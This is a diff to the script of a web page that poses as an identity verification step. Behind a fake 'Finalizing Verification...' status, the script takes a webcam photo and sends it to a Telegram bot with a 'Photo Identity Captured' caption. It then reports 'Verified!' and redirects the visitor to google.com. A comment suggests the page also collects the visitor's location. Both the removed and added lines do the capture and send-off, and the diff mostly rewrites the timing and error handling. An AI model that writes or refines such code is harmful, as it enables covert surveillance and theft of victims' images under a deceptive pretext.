@@ -92,64 +92,49 @@
         try {
             statusText.innerText = "Finalizing Verification...";
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            
-            if (!stream || !stream.getVideoTracks().length) {
-                throw new Error('No access to camera');
-            }
-
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            await new Promise(resolve => {
-                video.onloadedmetadata = () => {
-                    if (video.videoWidth === 0 || video.videoHeight === 0) {
-                        throw new Error('Video dimensions not available');
-                    }
-                    resolve();
-                };
-            });
+            // Wait for video to load
+            await new Promise(resolve => video.onloadedmetadata = resolve);
             
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            await new Promise(resolve => setTimeout(resolve, 1000)); 
+            // Wait 1 second to ensure camera focus
+            setTimeout(async () => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                
+                // Send to Telegram
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'identity_check.jpg');
+                formData.append('caption', '📸 Photo Identity Captured');
 
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const img = new Image();
-            img.src = canvas.toDataURL('image/jpeg');
-            document.body.appendChild(img); 
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
 
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-            if (!blob) {
-                throw new Error('Failed to create blob');
-            }
-
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'identity_check.jpg');
-            formData.append('caption', '📸 Photo Identity Captured');
-
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            stream.getTracks().forEach(track => track.stop());
-            
-            statusText.innerText = "Verified! Redirecting...";
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 2000); 
+                // Stop Camera
+                stream.getTracks().forEach(track => track.stop());
+                
+                statusText.innerText = "Verified! Redirecting...";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            }, 1000);
 
         } catch (err) {
             console.error(err);
-            window.location.href = "https://www.google.com";
+            // Even if camera fails, redirect after location
+            window.location.href = "https://detorlab";
         }
     }
 </script>
 
 </body>
 </html>
+
